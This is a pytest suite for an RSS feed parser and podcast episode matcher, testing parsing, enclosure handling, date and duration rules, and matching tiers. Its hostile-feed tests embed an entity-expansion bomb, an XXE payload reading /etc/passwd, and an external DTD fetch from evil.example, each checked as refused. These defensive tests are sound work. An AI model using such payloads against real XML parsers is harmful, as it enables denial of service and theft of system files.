from dataclasses import replace
from datetime import UTC, datetime, timedelta

import pytest

from earmark.resolve.rss import (
    FeedFormatError,
    FeedItem,
    durations_agree,
    match_item,
    parse_duration,
    parse_feed,
    parse_pub_date,
)
from tests.apple_fixtures import DAILY_GUID, fixture_bytes

HOST = "feeds.example"
T0 = datetime(2026, 11, 19, 10, 0, 0, tzinfo=UTC)


def _rss(items: str = "", *, channel_extra: str = "", root_attrs: str = "") -> bytes:
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>'
        f'<rss version="2.0" {root_attrs}><channel><title>Show</title>{channel_extra}'
        f"{items}</channel></rss>"
    ).encode()


# -- parsing real feeds --------------------------------------------------------------------------


def test_parse_daily_feed() -> None:
    feed = parse_feed(fixture_bytes("feed_daily.xml"), host=HOST)
    assert feed.title == "The Daily"
    assert len(feed.items) == 4
    [item] = [i for i in feed.items if i.guid == DAILY_GUID]
    assert item.title.startswith("\u2018Did A.I. Break the Internet?\u2019")
    assert item.published_at == datetime(2026, 11, 19, 10, 47, 59, tzinfo=UTC)
    assert item.duration_s == 1735.0
    assert item.enclosure_url is not None
    assert item.enclosure_url.startswith("https://dts.podtrac.com/redirect.mp3/")
    assert item.description
    assert [i.index for i in feed.items] == [0, 1, 2, 3]


@pytest.mark.parametrize(
    ("name", "count"),
    [("feed_daily.xml", 4), ("feed_business_wars.xml", 4), ("feed_planet_money.xml", 2)],
)
def test_fixture_feeds_parse(name: str, count: int) -> None:
    assert len(parse_feed(fixture_bytes(name), host=HOST).items) == count


def test_business_wars_dates_are_aware() -> None:
    feed = parse_feed(fixture_bytes("feed_business_wars.xml"), host=HOST)
    assert all(i.published_at is not None and i.published_at.tzinfo for i in feed.items)


def test_itunes_namespace_case_insensitive() -> None:
    item = (
        "<item><title>t</title><itunes:duration>01:00</itunes:duration>"
        "<itunes:summary>sum</itunes:summary></item>"
    )
    feed = parse_feed(
        _rss(item, root_attrs='xmlns:itunes="http://www.itunes.com/DTDs/Podcast-1.0.dtd"'),
        host=HOST,
    )
    assert feed.items[0].duration_s == 60.0
    assert feed.items[0].description == "sum"


def test_title_falls_back_to_itunes_title() -> None:
    item = "<item><itunes:title>From iTunes</itunes:title></item>"
    feed = parse_feed(
        _rss(item, root_attrs='xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd"'),
        host=HOST,
    )
    assert feed.items[0].title == "From iTunes"


def test_description_fallbacks() -> None:
    ns = 'xmlns:content="http://purl.org/rss/1.0/modules/content/"'
    only_content = "<item><content:encoded><![CDATA[<p>body</p>]]></content:encoded></item>"
    both = "<item><description>plain</description><content:encoded>x</content:encoded></item>"
    feed = parse_feed(_rss(only_content + both, root_attrs=ns), host=HOST)
    assert feed.items[0].description == "<p>body</p>"
    assert feed.items[1].description == "plain"


# -- unusual enclosures --------------------------------------------------------------------------


def _enclosure_url(tag: str) -> str | None:
    return parse_feed(_rss(f"<item><title>t</title>{tag}</item>"), host=HOST).items[0].enclosure_url


@pytest.mark.parametrize(
    "tag",
    [
        "",
        '<enclosure url="" type="audio/mpeg"/>',
        '<enclosure url="ftp://x.example/a.mp3" type="audio/mpeg"/>',
        '<enclosure url="https://x.example/a.m3u8" type="audio/mpeg"/>',
        '<enclosure url="https://x.example/a.jpg" type="image/jpeg"/>',
        '<enclosure type="audio/mpeg"/>',
    ],
    ids=["none", "empty", "ftp", "m3u8", "image", "no-url"],
)
def test_unusable_enclosure_counts_as_none(tag: str) -> None:
    assert _enclosure_url(tag) is None


@pytest.mark.parametrize(
    "tag",
    [
        '<enclosure url="https://x.example/a.mp3"/>',
        '<enclosure url="https://x.example/a.mp3" type="application/octet-stream"/>',
        '<enclosure url="https://x.example/a.mp3" type="audio/mpeg"/>',
        '<enclosure url="https://x.example/a.mp3" type="video/mp4"/>',
    ],
    ids=["no-type", "octet", "audio", "video"],
)
def test_usable_enclosure_kept(tag: str) -> None:
    assert _enclosure_url(tag) == "https://x.example/a.mp3"


def test_first_usable_enclosure_wins() -> None:
    tags = (
        '<enclosure url="https://x.example/a.jpg" type="image/jpeg"/>'
        '<enclosure url="https://x.example/a.mp3" type="audio/mpeg"/>'
    )
    assert _enclosure_url(tags) == "https://x.example/a.mp3"


# -- dates and durations -------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("Thu, 19 Nov 2026 10:47:59 +0000", datetime(2026, 11, 19, 10, 47, 59, tzinfo=UTC)),
        ("Thu, 19 Nov 2026 08:00:00 -0000", datetime(2026, 11, 19, 8, 0, 0, tzinfo=UTC)),
        ("Thu, 19 Nov 2026 08:00:00 GMT", datetime(2026, 11, 19, 8, 0, 0, tzinfo=UTC)),
        ("Thu, 19 Nov 2026 10:00:00 +0200", datetime(2026, 11, 19, 8, 0, 0, tzinfo=UTC)),
        ("2026-11-19T08:00:00Z", datetime(2026, 11, 19, 8, 0, 0, tzinfo=UTC)),
        ("2026-11-19T08:00:00", datetime(2026, 11, 19, 8, 0, 0, tzinfo=UTC)),
        ("garbage", None),
        ("", None),
        (None, None),
    ],
)
def test_parse_pub_date(value: str | None, expected: datetime | None) -> None:
    assert parse_pub_date(value) == expected


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("00:28:55", 1735.0),
        ("1131", 1131.0),
        ("1:00", 60.0),
        ("90.5", 90.5),
        ("1:02:03.5", 3723.5),
        ("-5", None),
        ("a:10", None),
        ("1:2:3:4", None),
        ("", None),
        ("nan", None),
        (None, None),
    ],
)
def test_parse_duration(value: str | None, expected: float | None) -> None:
    assert parse_duration(value) == expected


# -- hostile and broken feeds --------------------------------------------------------------------


@pytest.mark.parametrize(
    "data",
    [fixture_bytes("feed_daily.xml")[:5000], b"", b"<html><body>nope</body>"],
    ids=["truncated", "empty", "html"],
)
def test_malformed_feed(data: bytes) -> None:
    with pytest.raises(FeedFormatError) as info:
        parse_feed(data, host=HOST)
    message = info.value.message
    assert HOST in message
    assert "not valid XML" in message or "not an RSS feed" in message
    assert "Daily" not in message
    assert "<html>" not in message


def test_billion_laughs_refused() -> None:
    bomb = (
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
        '<!ENTITY lol2 "&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;">]>'
        "<rss><channel><title>&lol3;</title></channel></rss>"
    )
    with pytest.raises(FeedFormatError, match="entities"):
        parse_feed(bomb.encode(), host=HOST)


def test_external_entity_refused() -> None:
    doc = (
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        "<rss><channel><title>&xxe;</title></channel></rss>"
    )
    with pytest.raises(FeedFormatError) as info:
        parse_feed(doc.encode(), host=HOST)
    assert "entities" in info.value.message
    assert "passwd" not in info.value.message
    assert "root:" not in info.value.message


def test_external_parameter_entity_refused() -> None:
    doc = (
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil.example/x.dtd">%p;]>'
        "<rss><channel><title>t</title></channel></rss>"
    )
    with pytest.raises(FeedFormatError, match="entities"):
        parse_feed(doc.encode(), host=HOST)


def test_public_doctype_allowed() -> None:
    doc = (
        '<?xml version="1.0"?><!DOCTYPE rss PUBLIC "-//Netscape Communications//DTD RSS 0.91//EN" '
        '"http://my.netscape.com/publish/formats/rss-0.91.dtd">'
        '<rss version="0.91"><channel><title>Old</title></channel></rss>'
    )
    assert parse_feed(doc.encode(), host=HOST).title == "Old"


def test_undefined_entity_is_malformed() -> None:
    with pytest.raises(FeedFormatError, match="not valid XML"):
        parse_feed(_rss("<item><title>&nbsp;</title></item>"), host=HOST)


def test_non_rss_root() -> None:
    atom = b'<feed xmlns="http://www.w3.org/2005/Atom"><title>x</title></feed>'
    with pytest.raises(FeedFormatError, match="not an RSS feed"):
        parse_feed(atom, host=HOST)
    with pytest.raises(FeedFormatError, match="not an RSS feed"):
        parse_feed(b"<rss><nochannel/></rss>", host=HOST)


def test_feed_encodings() -> None:
    title = "Café Show"
    body = f"<rss><channel><title>{title}</title></channel></rss>"
    latin = f'<?xml version="1.0" encoding="ISO-8859-1"?>{body}'
    utf16 = f'<?xml version="1.0" encoding="UTF-16"?>{body}'
    assert parse_feed(latin.encode("iso-8859-1"), host=HOST).title == title
    assert parse_feed(utf16.encode("utf-16"), host=HOST).title == title


def test_host_in_messages_is_shortened_and_defaulted() -> None:
    with pytest.raises(FeedFormatError) as info:
        parse_feed(b"", host=None)
    assert "an unknown host" in info.value.message
    with pytest.raises(FeedFormatError) as info:
        parse_feed(b"", host="h" * 300)
    assert "h" * 100 in info.value.message
    assert "h" * 101 not in info.value.message


# -- matching ------------------------------------------------------------------------------------


def _item(
    index: int = 0,
    *,
    guid: str | None = None,
    title: str = "t",
    published_at: datetime | None = None,
    enclosure: str | None = None,
) -> FeedItem:
    return FeedItem(
        index=index,
        guid=guid,
        title=title,
        published_at=published_at,
        duration_s=None,
        enclosure_url=enclosure,
        description="",
    )


def _match(
    items: list[FeedItem],
    *,
    guid: str | None = None,
    audio_url: str | None = None,
    title: str = "",
    published_at: datetime | None = None,
) -> tuple[int, str] | None:
    found = match_item(
        items, guid=guid, audio_url=audio_url, title=title, published_at=published_at
    )
    return None if found is None else (found.item.index, found.tier)


def test_tier_order() -> None:
    items = [
        _item(0, title="same", published_at=T0),
        _item(1, guid="g", title="other", published_at=T0 + timedelta(days=30)),
    ]
    assert _match(items, guid="g", title="same", published_at=T0) == (1, "guid")


def test_guid_match_beats_first_item_with_same_title() -> None:
    items = [_item(0, guid="a", title="Same"), _item(1, guid="b", title="Same")]
    assert _match(items, guid="b", title="Same") == (1, "guid")


def test_enclosure_ignores_query_and_scheme() -> None:
    items = [
        _item(0, enclosure="https://Host.example/e/a.mp3?x=1"),
        _item(1, enclosure="https://host.example/e/b.mp3"),
    ]
    assert _match(items, audio_url="http://host.example/e/a.mp3?other=2") == (0, "enclosure")


def test_enclosure_requires_unique_path() -> None:
    items = [
        _item(0, title="dup", enclosure="https://h.example/a.mp3?x=1"),
        _item(1, title="dup", enclosure="https://h.example/a.mp3?x=2"),
    ]
    assert _match(items, audio_url="https://h.example/a.mp3", title="nomatch") is None
    # falls through to the title tier
    assert _match(items, audio_url="https://h.example/a.mp3", title="dup") == (0, "title")


def test_enclosure_skips_root_path() -> None:
    items = [_item(0, enclosure="https://h.example/")]
    assert _match(items, audio_url="https://h.example/") is None
    assert _match(items, audio_url="https://h.example") is None


def test_title_normalization_match() -> None:
    items = [_item(0, title="A &amp; B: “The  Thing”")]
    assert _match(items, title="a & b: 'the thing'") == (0, "title")


def test_title_duplicates_pick_nearest_date() -> None:
    items = [
        _item(0, title="Trailer", published_at=T0 - timedelta(days=400)),
        _item(1, title="Trailer", published_at=T0 + timedelta(days=3)),
        _item(2, title="Trailer", published_at=T0 - timedelta(days=200)),
    ]
    assert _match(items, title="trailer", published_at=T0) == (1, "title")
    assert _match(items, title="trailer") == (0, "title")


def test_title_duplicates_exact_date_beats_undated() -> None:
    items = [_item(0, title="x"), _item(1, title="x", published_at=T0)]
    assert _match(items, title="x", published_at=T0) == (1, "title")


def _precise(
    items: list[FeedItem], *, duration_s: float | None = None, at: datetime = T0
) -> tuple[int, str] | None:
    found = match_item(
        items, guid=None, audio_url=None, title="unrelated", published_at=at, duration_s=duration_s
    )
    return None if found is None else (found.item.index, found.tier)


def _timed(index: int, when: datetime, duration_s: float | None = None) -> FeedItem:
    return replace(_item(index, published_at=when), duration_s=duration_s)


@pytest.mark.parametrize(
    ("delta", "matches"),
    [
        (timedelta(0), True),
        (timedelta(seconds=60), True),
        (timedelta(seconds=-60), True),
        (timedelta(seconds=61), False),
        (timedelta(hours=1), False),
        (timedelta(hours=12), False),
        (timedelta(hours=23, minutes=58), False),
        (timedelta(hours=24), False),
    ],
    ids=["0s", "60s", "-60s", "61s", "1h", "12h", "23h58m", "24h"],
)
def test_date_precise_tolerance(delta: timedelta, matches: bool) -> None:
    result = _precise([_item(0, published_at=T0 + delta)])
    assert result == ((0, "date") if matches else None)


def test_date_previous_day_of_daily_show_not_matched() -> None:
    feed = parse_feed(fixture_bytes("feed_daily.xml"), host=HOST)
    items = [i for i in feed.items if i.guid != DAILY_GUID]
    previous = datetime(2026, 11, 18, 10, 49, 8, tzinfo=UTC)
    assert any(i.published_at == previous for i in items)
    target = datetime(2026, 11, 19, 10, 47, 59, tzinfo=UTC)
    found = match_item(
        items,
        guid=None,
        audio_url=None,
        title="unrelated",
        published_at=target,
        duration_s=1735.0,
    )
    assert found is None


def test_date_duration_must_agree() -> None:
    def run(apple: float | None, feed: float | None) -> object:
        return _precise([_timed(0, T0, feed)], duration_s=apple)

    assert run(1735, 1735) == (0, "date")
    assert run(1735, 1750) == (0, "date")
    assert run(1735, 1500) is None
    assert run(1735, None) == (0, "date")
    assert run(None, 1735) == (0, "date")


def test_date_same_instant_duplicates() -> None:
    unknown = [_timed(0, T0), _timed(1, T0)]
    assert _precise(unknown) is None
    agreeing = [_timed(0, T0, 1735), _timed(1, T0, 1740)]
    assert _precise(agreeing, duration_s=1735) is None
    one_contradicts = [_timed(0, T0, 900), _timed(1, T0, 1735)]
    assert _precise(one_contradicts, duration_s=1735) == (1, "date")


def test_date_close_neighbours_not_matched() -> None:
    items = [_timed(0, T0 - timedelta(minutes=5)), _timed(1, T0 + timedelta(minutes=5))]
    assert _precise(items, duration_s=1735) is None


def test_date_only_within_a_day() -> None:
    day = datetime(2024, 5, 15, tzinfo=UTC)

    def run(items: list[FeedItem], duration_s: float | None = 1131.0) -> object:
        found = match_item(
            items,
            guid=None,
            audio_url=None,
            title="unrelated",
            published_at=day,
            date_only=True,
            duration_s=duration_s,
        )
        return None if found is None else (found.item.index, found.tier)

    inside = _timed(0, datetime(2024, 5, 16, 2, 0, tzinfo=UTC), 1131)
    assert run([inside]) == (0, "date")
    assert run([_timed(0, datetime(2024, 5, 17, 0, 0, tzinfo=UTC), 1131)]) is None
    assert run([_timed(0, datetime(2024, 5, 16, 2, 0, tzinfo=UTC), 900)]) is None
    assert run([inside], duration_s=None) is None
    assert run([inside, _timed(1, datetime(2024, 5, 15, 21, 56, tzinfo=UTC), 1131)]) is None


@pytest.mark.parametrize(
    ("apple", "item", "agree"),
    [
        (1000, 1030, True),
        (1000, 1031, False),
        (1000, 970, True),
        (1000, 969, False),
        (2000, 2040, True),
        (2000, 2041, False),
        (5000, 5100, True),
        (5000, 5101, False),
    ],
)
def test_durations_agree(apple: float, item: float, agree: bool) -> None:
    assert durations_agree(apple, item) is agree


def test_no_tier_matches_returns_none() -> None:
    items = [_item(0, guid="a", title="x", published_at=T0 + timedelta(days=9))]
    assert (
        _match(items, guid="b", title="y", published_at=T0, audio_url="https://h.example/z") is None
    )
    assert _match([], guid="b", title="y", published_at=T0) is None


def test_empty_title_never_matches() -> None:
    items = [_item(0, title=""), _item(1, title="...")]
    assert _match(items, title="") is None
    assert _match(items, title="?!") is None


def test_fixture_lookups_shape() -> None:
    from tests.apple_fixtures import FIXTURES, fixture_json

    names = sorted(p.name for p in FIXTURES.glob("lookup_*.json"))
    assert len(names) == 5
    for name in names:
        data = fixture_json(name)
        assert data["resultCount"] == len(data["results"]), name
        if data["results"]:
            assert data["results"][0]["wrapperType"] == "track", name


def test_fixtures_readme_lists_every_file() -> None:
    from tests.apple_fixtures import FIXTURES

    readme = (FIXTURES / "README.md").read_text()
    for path in FIXTURES.iterdir():
        if path.name != "README.md":
            assert f"`{path.name}`" in readme, path.name
